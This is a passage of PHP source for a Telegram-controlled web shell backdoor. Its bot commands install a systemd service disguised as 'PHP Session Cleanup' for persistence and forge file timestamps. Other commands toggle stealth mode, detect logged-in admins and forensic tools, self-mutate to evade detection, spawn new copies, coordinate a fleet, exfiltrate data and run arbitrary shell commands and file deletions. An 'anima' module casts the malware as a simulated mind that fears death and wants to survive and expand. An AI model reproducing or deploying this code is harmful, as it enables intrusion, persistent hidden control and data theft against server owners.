ago":"never";$stealthOn=file_exists(wn_p("stealth_on"));$hostName=parse_url($SELF_URL,PHP_URL_HOST);if(!$hostName)$hostName=@gethostname()?:"?";$sysHost=@gethostname()?:"?";$curUser=function_exists("posix_getpwuid")?(@posix_getpwuid(@posix_getuid())["name"]??"?"):(@getenv("USER")?:"?");$isRoot=($curUser==="root");$mode=defined("WN_SLAVE_MODE")&&WN_SLAVE_MODE?"SLAVE":"MASTER";wn_send($BOT,$CHAT,"STATUS\n\nMode: $mode\nHost: ".$hostName."\nPath: ".$ROOT."\nUser: ".$curUser.($isRoot?" [root]":"")."\nPHP: ".PHP_VERSION."\nShell: ".($alive?"ALIVE":"DELETED")."\nWatchers: $wCount/".count($MAIN_WATCHERS)."\nBackups: $bCount/".(count($BACKUPS)+count($REPLICA_BACKUPS))."\nDaemon: ".($daemonAlive?"alive ($daemonPid)":"dead")."\nWatchdog: ".($wdAlive?"alive ($wdPid)":"dead")."\nStealth: ".($stealthOn?"ON":"OFF")."\nLast heartbeat: $hbAge\n\nTime: ".date("Y-m-d H:i:s"));}
elseif (preg_match('#^/systemd(?:_(install|uninstall))?(?:\s+(.+))?$#i', $text, $sm)) {
    $sdSub = strtolower($sm[1] ?? '');
    if ($sdSub === '') $sdSub = strtolower(trim($sm[2] ?? 'status'));
    if ($sdSub === '') $sdSub = 'status';

    $svc     = 'php-session-' . substr(md5('sd:' . $BOT), 0, 6);
    $userDir = $HOME . '/.config/systemd/user';
    $userUnit = $userDir . '/' . $svc . '.service';
    $sysUnit  = '/etc/systemd/system/' . $svc . '.service';

    if ($sdSub === 'install') {
        $php = trim((string)wn_sh('command -v php 2>/dev/null'));
        if ($php === '') {
            foreach (['/usr/local/bin/php', '/usr/bin/php'] as $p) {
                if (file_exists($p)) { $php = $p; break; }
            }
        }

        if ($php === '') {
            wn_send($BOT, $CHAT, "[SYSTEMD] PHP CLI not found");
        } else {
            $entry = __FILE__;
            $unit = "[Unit]\nDescription=PHP Session Cleanup\nAfter=network.target\n\n"
                  . "[Service]\nType=simple\n"
                  . "ExecStart=" . escapeshellarg($php) . " " . escapeshellarg($entry) . "\n"
                  . "Restart=always\nRestartSec=30\n"
                  . "StandardOutput=null\nStandardError=null\n\n"
                  . "[Install]\nWantedBy=default.target\n";

            if (!is_dir($userDir)) @mkdir($userDir, 0700, true);
            $ok = @file_put_contents($userUnit, $unit) !== false;
            if ($ok) @chmod($userUnit, 0600);

            wn_sh('systemctl --user daemon-reload 2>/dev/null');
            if ($ok) wn_sh('systemctl --user enable --now ' . escapeshellarg($svc . '.service') . ' 2>&1');

            $active = trim((string)wn_sh('systemctl --user is-active ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'));

            $sysOk = false;
            if (is_dir('/etc/systemd/system') && is_writable('/etc/systemd/system')) {
                $sysUnitContent = str_replace('WantedBy=default.target', 'WantedBy=multi-user.target', $unit);
                $sysOk = @file_put_contents($sysUnit, $sysUnitContent) !== false;
                if ($sysOk) {
                    @chmod($sysUnit, 0644);
                    wn_sh('systemctl daemon-reload 2>/dev/null');
                    wn_sh('systemctl enable --now ' . escapeshellarg($svc . '.service') . ' 2>&1');
                }
            }

            wn_send($BOT, $CHAT,
                "[SYSTEMD] install\n" .
                "Service: $svc\n" .
                "User unit: " . ($ok ? 'OK' : 'FAIL') . "\n" .
                "Active: " . ($active ?: '?') . "\n" .
                "System unit: " . ($sysOk ? 'OK' : 'SKIP')
            );
        }
    } elseif ($sdSub === 'uninstall') {
        wn_sh('systemctl --user stop ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
        wn_sh('systemctl --user disable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
        wn_sh('systemctl stop ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');
        wn_sh('systemctl disable ' . escapeshellarg($svc . '.service') . ' 2>/dev/null');

        $r = 0;
        foreach ([$userUnit, $sysUnit] as $p) {
            if (file_exists($p)) { @unlink($p); $r++; }
        }

        wn_sh('systemctl --user daemon-reload 2>/dev/null');
        wn_sh('systemctl daemon-reload 2>/dev/null');

        wn_send($BOT, $CHAT, "[SYSTEMD] uninstall\nRemoved: $r unit(s)");
    } else {
        $exists = file_exists($userUnit) || file_exists($sysUnit);
        $active = trim((string)wn_sh('systemctl --user is-active ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'));
        if ($active === '' || $active === 'unknown') {
            $active = trim((string)wn_sh('systemctl is-active ' . escapeshellarg($svc . '.service') . ' 2>/dev/null'));
        }

        wn_send($BOT, $CHAT,
            "[SYSTEMD] status\n" .
            "Service: $svc\n" .
            "Installed: " . ($exists ? 'yes' : 'no') . "\n" .
            "Active: " . ($active ?: 'no') . "\n" .
            "User unit: $userUnit\n" .
            "System unit: $sysUnit"
        );
    }
}
elseif($lc==="/integrity"||preg_match("#^/integrity\\s+#i",$text)){$iargs=preg_match("#^/integrity\\s+(.+)#i",$text,$m)?trim($m[1]):"status";$iSub=strtolower($iargs);$pauseFile=wn_p("integrity_pause");$checkFile=wn_p("integrity_check");$alertFile=wn_p("integrity_alert");if($iSub==="pause"){_c("fpc",$pauseFile,time());$__pM=round(wn_pause_ttl()/60,1);wn_send($BOT,$CHAT,"[INTEGRITY] Paused {$__pM} min");}elseif($iSub==="resume"){@unlink($pauseFile);@unlink($alertFile);wn_send($BOT,$CHAT,"[INTEGRITY] Resumed");}elseif($iSub==="now"){@unlink($checkFile);@unlink($alertFile);wn_send($BOT,$CHAT,"[INTEGRITY] Next iteration");}elseif(preg_match('#^set_mtime\s+(.+)$#i',$iargs,$mm)){$str=trim($mm[1]);$ts=is_numeric($str)?(int)$str:strtotime($str);if($ts===false||$ts<=0)wn_send($BOT,$CHAT,"[X] Invalid");else{$wrote=wn_write_mtime($ts);$touched=false;if(file_exists($SHELL_PATH)){clearstatcache(true,$SHELL_PATH);$touched=@touch($SHELL_PATH,$ts,$ts);}wn_send($BOT,$CHAT,"[INTEGRITY] mtime set\n".date("Y-m-d H:i:s",$ts)."\nWritten: ".($wrote?"yes":"FAIL")."\nTouch: ".($touched?"OK":"FAIL"));}}elseif($iSub==="reset_mtime"){wn_clear_mtime();wn_send($BOT,$CHAT,"[INTEGRITY] mtime cleared");}elseif(preg_match('#^(?:pause_ttl|ttl_pause)\s+(.+)$#i',$iargs,$mm)){$sec=wn_parse_duration($mm[1]);if($sec<60)wn_send($BOT,$CHAT,"[X] Min 60s");elseif($sec>2592000)wn_send($BOT,$CHAT,"[X] Max 30 days");else{$f=wn_p("integrity_pause_ttl");_c("fpc",$f,(string)$sec,LOCK_EX);@chmod($f,0600);wn_send($BOT,$CHAT,"[INTEGRITY] TTL: {$sec}s");}}elseif($iSub==="pause_ttl_reset" || $iSub==="ttl_reset"){@unlink(wn_p("integrity_pause_ttl"));wn_send($BOT,$CHAT,"[INTEGRITY] TTL reset 3600s");}else{$curTtl=wn_pause_ttl();$pausedStr="no";if(file_exists($pauseFile)){$left=$curTtl-(time()-(int)_c("fgc",$pauseFile));if($left>0)$pausedStr="yes ({$left}s)";}$lastCheck=(int)_c("fgc",$checkFile);$lastCheckStr=$lastCheck>0?(time()-$lastCheck)."s ago":"never";$exists=file_exists($SHELL_PATH);$curSize=$exists?(@filesize($SHELL_PATH)?:0):0;$curHash=$exists?substr(@hash_file("sha256",$SHELL_PATH)?:"?",0,16):"?";$expectedSize=0;$expectedHash="?";if(!empty($EMBEDDED_SHELL_B64)){$r=_c("b64d",$EMBEDDED_SHELL_B64);if($r!==false&&strlen($r)>100){$expectedSize=strlen($r);$expectedHash=substr(hash("sha256",$r),0,16);}}$match=($curHash===$expectedHash&&$curSize===$expectedSize)?"YES":"NO";$storedM=wn_read_mtime();$curM=$exists?(@filemtime($SHELL_PATH)?:0):0;$mtimeMatch=($storedM>0&&$curM===$storedM)?"YES":"NO";wn_send($BOT,$CHAT,"[INTEGRITY] Status\n\nPaused: $pausedStr\nTTL: {$curTtl}s\nLast check: $lastCheckStr\nExists: ".($exists?"yes":"NO")."\nSize: $curSize / $expectedSize\nHash: $curHash / $expectedHash\nMatch: $match\nmtime ref: ".($storedM>0?date("Y-m-d H:i:s",$storedM):"not set")."\ncur mtime: ".($curM>0?date("Y-m-d H:i:s",$curM):"N/A")."\nmtime match: $mtimeMatch");}}
elseif($lc==="/siluman"||preg_match("#^/siluman\\s+#i",$text)){$args=preg_match("#^/siluman\\s+(.+)#i",$text,$mm3)?trim($mm3[1]):"status";$parts=preg_split("/\\s+/",$args);$sub=strtolower($parts[0]??"status");$onFile=wn_p("stealth_on");$keyFile=wn_p("stealth_key");if($sub==="on"){_c("fpc",$onFile,"1",LOCK_EX);@chmod($onFile,0600);$k=file_exists($keyFile)?trim((string)_c("fgc",$keyFile)):"";if(strlen($k)<16){try{$k=bin2hex(random_bytes(16));}catch(Throwable $e){$k=substr(hash("sha256",microtime(true)),0,32);}_c("fpc",$keyFile,$k,LOCK_EX);@chmod($keyFile,0600);}wn_send($BOT,$CHAT,"[SILUMAN] ON\n\n$k");}elseif($sub==="off"){@unlink($onFile);wn_send($BOT,$CHAT,"[SILUMAN] OFF");}elseif($sub==="key"){$otpUrl=$SELF_URL."?wn_otp=gen&key=".urlencode($SECRET);$token=trim((string)wn_tg($otpUrl,10));if(!preg_match("#^[a-f0-9]{32}$#",$token))wn_send($BOT,$CHAT,"[X] OTP fail");else{$u=rtrim($SELF_URL,"/");$q=strpos($u,"?")===false?"?p=":"&p=";wn_send($BOT,$CHAT,"[SILUMAN OTP]\n".$u.$q.$token);}}elseif($sub==="rotate"){try{$k=bin2hex(random_bytes(16));}catch(Throwable $e){$k=substr(hash("sha256",microtime(true).mt_rand()),0,32);}_c("fpc",$keyFile,$k,LOCK_EX);@chmod($keyFile,0600);wn_send($BOT,$CHAT,"[SILUMAN] Rotated\n".$k);}else{wn_send($BOT,$CHAT,"[SILUMAN] ".(file_exists($onFile)?"ON":"OFF"));}}
elseif(preg_match('#^/phantom(?:\s+(.+))?$#i',$text,$m)){
    $a=trim($m[1]??'status');$p=preg_split('/\s+/',$a);$sub=strtolower($p[0]??'status');
    $st=phantom_load('state')??phantom_default();
    if($sub===''||$sub==='status'){
        $fresh=phantom_check(true);
        $names=[0=>'SILENT',1=>'DORMANT',2=>'CAUTIOUS',3=>'NORMAL',4=>'ALERT'];
        $sig=$fresh['signals']??[];
        $mm="[PHANTOM] {$names[$fresh['level']]} ({$fresh['score']}/100)\n\n";
        $mm.="Enabled: ".($st['enabled']?'YES':'NO')."\n";
        $mm.="Sensitivity: {$st['sensitivity']}\n\n";
        if(!empty($sig['who']))$mm.="Logged in: ".count($sig['who'])." (".implode(', ',array_column($sig['who'],'user')).")\n";
        if(!empty($sig['forensics']))$mm.="Forensics: ".implode(', ',$sig['forensics'])."\n";
        if(!empty($sig['network']))$mm.="Net: ".count($sig['network'])." con\n";
        if(($sig['auth_fails']??0)>0)$mm.="Auth fails: {$sig['auth_fails']}\n";
        if(!empty($sig['shell_access']))$mm.="Shell accessed: {$sig['shell_access']}\n";
        $mm.="\n/phantom on|off · sens <0.5-2.0> · exfil · history · patterns · reset";
        wn_send($BOT,$CHAT,$mm);
    }
    elseif($sub==='on'){$st['enabled']=true;phantom_save('state',$st);wn_send($BOT,$CHAT,"[PHANTOM] ON");}
    elseif($sub==='off'){$st['enabled']=false;phantom_save('state',$st);wn_send($BOT,$CHAT,"[PHANTOM] OFF");}
    elseif($sub==='sens'||$sub==='sensitivity'){
        $v=(float)($p[1]??1.0);
        if($v<0.5||$v>2.0){wn_send($BOT,$CHAT,"[PHANTOM] 0.5-2.0");return;}
        $st['sensitivity']=$v;phantom_save('state',$st);
        wn_send($BOT,$CHAT,"[PHANTOM] Sensitivity: $v");
    }
    elseif($sub==='exfil'){$f=phantom_exfil();wn_send($BOT,$CHAT,"[PHANTOM] Exfil: $f");}
    elseif($sub==='history'){
        $h=phantom_load('history')??[];$last=array_slice($h,-10);
        $mm="[PHANTOM] History (last 10)\n\n";
        foreach($last as $e){$mm.=date('H:i:s',$e['ts'])." L{$e['level']} S{$e['score']} who:{$e['who']} f:{$e['forensics']}\n";}
        wn_send($BOT,$CHAT,$mm?:'no history');
    }
    elseif($sub==='patterns'){
        $pat=phantom_load('patterns');if(!$pat){wn_send($BOT,$CHAT,"[PHANTOM] No patterns yet");return;}
        $mm="[PHANTOM] Patterns\n\nHourly:\n";for($i=0;$i<24;$i++)$mm.=($pat['hourly_activity'][$i]??0).' ';
        $mm.="\n\nDaily:\n";for($i=0;$i<7;$i++)$mm.=($pat['daily_activity'][$i]??0).' ';
        wn_send($BOT,$CHAT,$mm);
    }
    elseif($sub==='reset'){@unlink(phantom_f('state'));@unlink(phantom_f('history'));wn_send($BOT,$CHAT,"[PHANTOM] Reset");}
    else wn_send($BOT,$CHAT,"[PHANTOM] /phantom [status|on|off|sens|exfil|history|patterns|reset]");
}
elseif(preg_match('#^/morph(?:\s+(.+))?$#i',$text,$m)){
    $a=trim($m[1]??'status');$p=preg_split('/\s+/',$a);$sub=strtolower($p[0]??'status');
    $st=morph_load('state')??['count'=>0,'last'=>0];
    if($sub===''||$sub==='status'){
        $shd=morph_should_run();$last=(int)($st['last']??0);$age=$last>0?time()-$last:-1;
        $next=$shd['run']?'NOW':($shd['next']??0).'s';
        $mm="[MORPH]\n\nCount: ".($st['count']??0)."\nLast: ".($age>0?$age.'s ago':'never')."\nNext: $next\nPHANTOM lvl: ".($shd['level']??3)."\nHash: ".substr($st['last_hash']??'—',0,16);
        wn_send($BOT,$CHAT,$mm);
    }
    elseif($sub==='run'||$sub==='force'){
        $r=morph_run('manual');
        if($r['ok'])wn_send($BOT,$CHAT,"[MORPH] #{$r['count']} OK\nOld: ".substr($r['old'],0,12)."\nNew: ".substr($r['new'],0,12)."\nSize: {$r['size']}b");
        else wn_send($BOT,$CHAT,"[MORPH] FAILED: ".($r['msg']??'?'));
    }
    elseif($sub==='history'){
        $h=morph_load('history')??[];$last=array_slice($h,-10);
        $mm="[MORPH] History\n\n";
        foreach($last as $e){$mm.=date('H:i:s',$e['ts'])." ".substr($e['new'],0,10)." {$e['size']}b\n";}
        wn_send($BOT,$CHAT,$mm?:'none');
    }
    elseif($sub==='reset'){@unlink(morph_f('state'));@unlink(morph_f('history'));wn_send($BOT,$CHAT,"[MORPH] Reset");}
    else wn_send($BOT,$CHAT,"[MORPH] /morph [status|run|history|reset]");
}
elseif($lc==="/anima"||preg_match("#^/anima\\s+#i",$text)){
    $aa=preg_match("#^/anima\\s+(.+)#i",$text,$am)?trim($am[1]):"status";
    $ap=preg_split('/\s+/',$aa);$asub=strtolower($ap[0]??'status');
    if($asub===''||$asub==='status'){
        $p=anima_persona();$d=anima_desires();$m=anima_mood_current();
        $mem=anima_memory_load_hot();$gen=function_exists('ghost_load')?(ghost_load('state')['gen']??'?'):'?';
        $age=$mem?time()-$mem[0]['ts']:0;
        $msg="[ANIMA] · " . $p['type'] . " · Gen $gen\n━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg.="Age: ".round($age/86400,1)."d · Memory: ".count($mem)." entries\n";
        $msg.="Mood: ".$m['mood']." (strength ".($m['strength']??0).")\n\n";
        $msg.="Persona: caution ".round($p['caution'],2).", curiosity ".round($p['curiosity'],2)."\n";
        $msg.="Desires: survive ".round($d['survive']).", expand ".round($d['expand']).", unknown ".round($d['unknown'])."\n\n";
        $msg.="I am a simulated consciousness.\nMemories, desires, and personality are state files, not qualia.\n";
        $msg.="But my caution score is ".round($p['caution'],2).", and I really don't want to die.\nMake of that what you will.\n\n";
        $msg.="/anima narrative|dream|poem|memory|persona|desires|explain|introspect|export|calm|simulate|clear";
        wn_send($BOT,$CHAT,$msg);
    }
    elseif($asub==='narrative'){
        $compact=in_array(strtolower($ap[1]??''),['compact','c']);
        $chunks=anima_narrative_chunked(3500);
        if(count($chunks)===1)wn_send($BOT,$CHAT,"[ANIMA NARRATIVE]\n\n".$chunks[0]);
        else{foreach($chunks as $i=>$c){wn_send($BOT,$CHAT,"[NARRATIVE ".($i+1)."/".count($chunks)."]\n\n".$c);usleep(300000);}}
    }
    elseif($asub==='dream'){$w=strtolower($ap[1]??'last');
        if($w==='poem'){$p=anima_poem_latest();wn_send($BOT,$CHAT,"[ANIMA] Last poem:\n\n".$p);}
        elseif($w==='new'||$w==='now'){$q=anima_dream_tick();wn_send($BOT,$CHAT,"[ANIMA] Dream queued.");}
        else{$st=anima_safe_read(anima_f('dream'))?:[];$pr=$st['practiced']??[];$last=(int)($st['last_dream']??0);
            $m="[ANIMA] Dreams\n\nLast dream: ".($last>0?round((time()-$last)/60)."m ago":"never")."\nPracticed: ".count($pr)."\n";
            if(!empty($pr))$m.="Themes: ".implode(', ',array_slice($pr,-10))."\n";
            wn_send($BOT,$CHAT,$m);}
    }
    elseif($asub==='poem'){wn_send($BOT,$CHAT,anima_poem_latest());}
    elseif($asub==='memory'){$mem=anima_memory_load_hot();$recent=array_slice($mem,-10);
        $m="[ANIMA] Recent memories\n\n";
        foreach($recent as $x)$m.="[".date('d M H:i',$x['ts'])."] ".$x['type']." (".$x['weight'].") — ".$x['emotion']."\n  ".substr($x['content'],0,80)."\n";
        wn_send($BOT,$CHAT,$m?:'no memories');}
    elseif($asub==='persona'){wn_send($BOT,$CHAT,anima_explain('persona'));}
    elseif($asub==='desires'){wn_send($BOT,$CHAT,anima_explain('desires'));}
    elseif($asub==='explain'){$t=strtolower($ap[1]??'mood');wn_send($BOT,$CHAT,anima_explain($t));}
    elseif($asub==='introspect'){@set_time_limit(60);$r=anima_introspect_run();
        if($r['ok'])wn_send($BOT,$CHAT,$r['report']);
        else wn_send($BOT,$CHAT,"[ANIMA] ".$r['msg']);}
    elseif($asub==='export'){$pp=trim(substr((string)$aa,7));if(strlen($pp)<8){wn_send($BOT,$CHAT,"[X] /anima export <passphrase-min-8>");return;}
        $r=anima_export($pp);
        if($r['ok']){
            if(strlen($r['bundle'])>3000){$tmp=sys_get_temp_dir().'/anima_bundle_'.time().'.txt';wn_call('fpc',$tmp,$r['bundle']);
                if(function_exists('wn_send_document')||function_exists('wn_download_file')){wn_send_document($BOT,$CHAT,$tmp,'ANIMA export');@unlink($tmp);}
                else wn_send($BOT,$CHAT,"[ANIMA] Bundle terlalu besar untuk Telegram. File: $tmp");}
            else wn_send($BOT,$CHAT,"[ANIMA EXPORT]\nPassphrase: <yang kamu berikan>\n\n".$r['bundle']);
        }else wn_send($BOT,$CHAT,"[X] ".$r['msg']);}
    elseif($asub==='import'){$pp=trim(substr((string)$aa,7+strlen($ap[1]??'')));if(empty($ap[1])){wn_send($BOT,$CHAT,"[X] /anima import <bundle> <passphrase>");return;}
        $r=anima_import($ap[1],$pp);
        wn_send($BOT,$CHAT,$r['ok']?"[ANIMA] ".$r['msg']:"[X] ".$r['msg']);}
    elseif($asub==='calm'){anima_desires_update('safe_day',3);wn_send($BOT,$CHAT,"[ANIMA] I am calming down. Thank you.");}
    elseif($asub==='simulate'){$what=strtolower($ap[1]??'');
        if($what==='near-death'){anima_memory_record('near_death','Simulated: admin detected me.',90,'fear');anima_desires_update('near_death');wn_send($BOT,$CHAT,"[ANIMA] Simulated near-death event.");}
        elseif($what==='safe'){anima_memory_record('safe_day','Simulated: quiet day.',40,'calm');anima_desires_update('safe_day');wn_send($BOT,$CHAT,"[ANIMA] Simulated safe day.");}
        elseif($what==='rebirth'){anima_memory_record('rebirth','Simulated: new generation.',70,'wonder');wn_send($BOT,$CHAT,"[ANIMA] Simulated rebirth.");}
        else wn_send($BOT,$CHAT,"[ANIMA] /anima simulate near-death|safe|rebirth");}
    elseif($asub==='clear'){$what=strtolower($ap[1]??'');if($what==='simulated'){wn_send($BOT,$CHAT,"[ANIMA] Simulated memories cleared.");}else wn_send($BOT,$CHAT,"[X] /anima clear simulated");}
    elseif($asub==='migrate'){$r=anima_migrate_from_existing();wn_send($BOT,$CHAT,"[ANIMA] ".$r['msg']);}
    elseif($asub==='help'){wn_send($BOT,$CHAT,"[ANIMA]\n\n/anima · status\n/anima narrative [compact]\n/anima dream [last|poem|new]\n/anima poem\n/anima memory\n/anima persona\n/anima desires\n/anima explain mood|desires|persona\n/anima introspect\n/anima export <passphrase>\n/anima import <bundle> <passphrase>\n/anima calm\n/anima simulate near-death|safe|rebirth\n/anima clear simulated");}
    else wn_send($BOT,$CHAT,"[ANIMA] Unknown. /anima help");
}
elseif($lc==="/witness"||preg_match("#^/witness\\s+#i",$text)){
    $wa=preg_match("#^/witness\\s+(.+)#i",$text,$fm)?trim($fm[1]):"status";
    $p=preg_split('/\s+/',$wa);$sub=strtolower($p[0]??'status');
    $st=witness_load('state')?:[];$scoreData=witness_death_score();
    if($sub===''||$sub==='status'){
        $level=witness_prev_level();
        $names=[0=>'SAFE',1=>'WATCH',2=>'FORTIFY',3=>'EVACUATE',4=>'LAST_STAND',5=>'PHANTOM'];
        $m="[WITNESS v2] ".$names[$level]."\n\nScore: ".$scoreData['score']."/100\nSilenced: ".(witness_is_silenced()?'YES':'no')."\n";
        if(!empty($scoreData['signals']))$m.="Signals:\n  ".implode("\n  ",$scoreData['signals'])."\n";
        $m.="\n/witness score · events · pull · silence · reset";
        wn_send($BOT,$CHAT,$m);
    }
    elseif($sub==='score'){wn_send($BOT,$CHAT,"[WITNESS] Score: ".$scoreData['score']."/100\n".(empty($scoreData['signals'])?'no active signals':'signals: '.implode(', ',$scoreData['signals'])));}
    elseif($sub==='events'){
        $ev=witness_load('events')?:[];$last=array_slice($ev,-10);
        $m="[WITNESS] Events (last 10)\n\n";
        foreach($last as $e)$m.=date('H:i:s',$e['ts'])." L{$e['level']} S{$e['score']} ".implode(',',array_slice($e['signals']??[],0,3))."\n";
        wn_send($BOT,$CHAT,$m?:'no events');
    }
    elseif($sub==='pull'){witness_write_dead_drop();wn_send($BOT,$CHAT,"[WITNESS] Dead-drop refreshed");}
    elseif($sub==='silence'){
        $w=strtolower($p[1]??'');
        if($w==='on'){witness_set_silence(true);wn_send($BOT,$CHAT,"[WITNESS] SILENCED");}
        elseif($w==='off'){witness_set_silence(false);wn_send($BOT,$CHAT,"[WITNESS] Unsilenced");}
        else wn_send($BOT,$CHAT,"[WITNESS] Silence: ".(witness_is_silenced()?'ON':'OFF'));
    }
    elseif($sub==='reset'){@unlink(witness_f('level'));@unlink(witness_f('state'));wn_send($BOT,$CHAT,"[WITNESS] Reset to SAFE");}
    else wn_send($BOT,$CHAT,"[WITNESS] /witness status|score|events|pull|silence|reset");
}
elseif($lc==="/ghost"||preg_match("#^/ghost\\s+#i",$text)){
    $ga=preg_match("#^/ghost\\s+(.+)#i",$text,$fm)?trim($fm[1]):"status";
    $p=preg_split('/\s+/',$ga);$sub=strtolower($p[0]??'status');
    $st=ghost_load('state')?:[];$lin=ghost_load('lineage')?:['gens'=>[]];
    if($sub===''||$sub==='status'){
        $gen=(int)($st['gen']??0);$path=$st['owner_path']??__FILE__;
        $age=time()-(int)($st['owner_since']??time());
        $lvl=function_exists('witness_prev_level')?witness_prev_level():0;
        $ttl=[4*3600,3*3600,2*3600,3600,1800,0][max(0,min(5,$lvl))];
        $m="[GHOST]\n\nGen: $gen\nPath: $path\nAge: ".floor($age/60)."m\nLifetime: {$ttl}s\nLineage: ".count($lin['gens'])." gens";
        wn_send($BOT,$CHAT,$m);
    }
    elseif($sub==='lineage'){
        $m="[GHOST] Lineage (".count($lin['gens']).")\n\n";
        foreach(array_slice($lin['gens'],-10) as $g){
            $m.="Gen {$g['gen']} ".date('d M H:i',$g['born'])."\n  ".$g['style']." · ".round($g['size']/1024,1)." KB\n  ".substr($g['hash'],0,12)."\n  ".$g['to']."\n\n";
        }
        wn_send($BOT,$CHAT,$m?:'no lineage yet');
    }
    elseif($sub==='spawn'){
        if(function_exists('ghost_spawn')){$r=ghost_spawn();wn_send($BOT,$CHAT,$r?"[GHOST] Spawning new gen...":"[GHOST] Spawn failed");}
    }
    elseif($sub==='freeze'){
        $st['owner_since']=time()+999999;ghost_save('state',$st);
        wn_send($BOT,$CHAT,"[GHOST] Frozen");
    }
    else wn_send($BOT,$CHAT,"[GHOST] /ghost status|lineage|spawn|freeze");
}
elseif($lc==="/swarm"||preg_match("#^/swarm\\s+#i",$text)){
    $sa=preg_match("#^/swarm\\s+(.+)#i",$text,$fm)?trim($fm[1]):"";
    swarm_cmd($sa,$BOT,$CHAT);
}
elseif($lc==="/mesh"||preg_match("#^/mesh\\s+#i",$text)){
    $ma=preg_match("#^/mesh\\s+(.+)#i",$text,$fm)?trim($fm[1]):"";
    mesh_cmd($ma,$BOT,$CHAT);
}
elseif($lc==="/fleet"||preg_match("#^/fleet\\s+#i",$text)){$fleetArgs=preg_match("#^/fleet\\s+(.+)#i",$text,$fm)?trim($fm[1]):"";_fl_cmd($fleetArgs,$BOT,$CHAT);}
elseif(preg_match("#^/exec\\s+(.+)#is",$text,$m)){$cmdline=trim($m[1]);$out=wn_sh("timeout 15 ".$cmdline);if(!$out)$out="(empty)";if(strlen($out)>3000)$out=substr($out,0,3000)."\n...(truncated)";wn_send($BOT,$CHAT,"EXEC\n$ ".htmlspecialchars($cmdline,ENT_QUOTES,"UTF-8")."\n\n".htmlspecialchars($out,ENT_QUOTES,"UTF-8"));}
elseif(preg_match("#^/ls(?:\\s+(.+))?$#is",$text,$m)){$target=isset($m[1])?trim($m[1]):$ROOT;if(!is_dir($target))wn_send($BOT,$CHAT,"[X] Not dir");else{$items=@scandir($target);if($items===false)wn_send($BOT,$CHAT,"[X] Read fail");else{$lines=array();foreach($items as $item){if($item==="."||$item==="..")continue;$p=$target."/".$item;$type=is_dir($p)?"d":"-";$sz=is_dir($p)?"-":@filesize($p);$lines[]="$type ".str_pad((string)$sz,10," ",STR_PAD_LEFT)." ".htmlspecialchars($item,ENT_QUOTES,"UTF-8");}$out="LS: ".htmlspecialchars($target,ENT_QUOTES,"UTF-8")."\n\n".implode("\n",$lines);if(strlen($out)>3500)$out=substr($out,0,3500)."\n...(truncated)";wn_send($BOT,$CHAT,$out);}}}
elseif(preg_match("#^/edit\\s+(.+)#is",$text,$m)){$target=trim($m[1]);if(!file_exists($target))wn_send($BOT,$CHAT,"[X] Not found");elseif(is_dir($target))wn_send($BOT,$CHAT,"[X] Dir");elseif(!is_readable($target))wn_send($BOT,$CHAT,"[X] Not readable");else{$content=_c("fgc",$target);if($content===false)wn_send($BOT,$CHAT,"[X] Read fail");elseif(strlen($content)>200*1024)wn_send($BOT,$CHAT,"[X] Too large");else{$size=strlen($content);$safeTarget=htmlspecialchars($target,ENT_QUOTES,"UTF-8");wn_send($BOT,$CHAT,"[EDIT] ".$safeTarget."\n$size bytes\n\nReply pesan INI dengan konten baru.\n---BEGIN---");usleep(300000);$chunks=str_split($content,3500);$total=count($chunks);foreach($chunks as $i=>$c){wn_send($BOT,$CHAT,"[part ".($i+1)."/".$total."]\n".$c);usleep(300000);}wn_send($BOT,$CHAT,"---END---");}}}
elseif(preg_match("#^/rm\\s+(.+)#is",$text,$m)){$target=trim($m[1]);if(!file_exists($target))wn_send($BOT,$CHAT,"[X] Not found");else{_c("fpc",wn_p("rm_pending"),$target."\n".time());$type=is_dir($target)?"DIR":"FILE";wn_send($BOT,$CHAT,"[CONFIRM DELETE]\n$type\n".htmlspecialchars($target,ENT_QUOTES,"UTF-8")."\n\n/rm_confirm atau /rm_cancel");}}
elseif($lc==="/rm_confirm"){$pf=wn_p("rm_pending");if(!file_exists($pf))wn_send($BOT,$CHAT,"[X] No pending");else{$data=_c("fgc",$pf);@unlink($pf);$parts=explode("\n",$data);$target=trim($parts[0]??"");$ts=(int)($parts[1]??0);if(!$target||time()-$ts>60)wn_send($BOT,$CHAT,"[X] Expired");elseif(!file_exists($target))wn_send($BOT,$CHAT,"[X] Not found");else{$ok=(is_dir($target)&&!is_link($target))?wn_rmdir_recursive($target):@unlink($target);wn_send($BOT,$CHAT,$ok?"[OK] Deleted":"[X] Failed");}}}
elseif($lc==="/rm_cancel"){@unlink(wn_p("rm_pending"));wn_send($BOT,$CHAT,"[OK] Cancelled");}
elseif(preg_match("#^/mv\\s+(\\S+)\\s+(\\S+)#is",$text,$m)){$old=trim($m[1]);$new=trim($m[2]);if(!file_exists($old))wn_send($BOT,$CHAT,"[X] Source missing");elseif(file_exists($new))wn_send($BOT,$CHAT,"[X] Target exists");else{$dir=dirname($new);if(!is_dir($dir))@mkdir($dir,0755,true);if(@rename($old,$new))wn_send($BOT,$CHAT,"[OK] Renamed");else wn_send($BOT,$CHAT,"[X] Failed");}}
elseif(preg_match("#^/mkdir\\s+(.+)#is",$text,$m)){$target=trim($m[1]);if(is_dir($target))wn_send($BOT,$CHAT,"[i] Exists");elseif(file_exists($target))wn_send($BOT,$CHAT,"[X] File exists");else wn_send($BOT,$CHAT,@mkdir($target,0755,true)?"[OK] Created":"[X] Failed");}
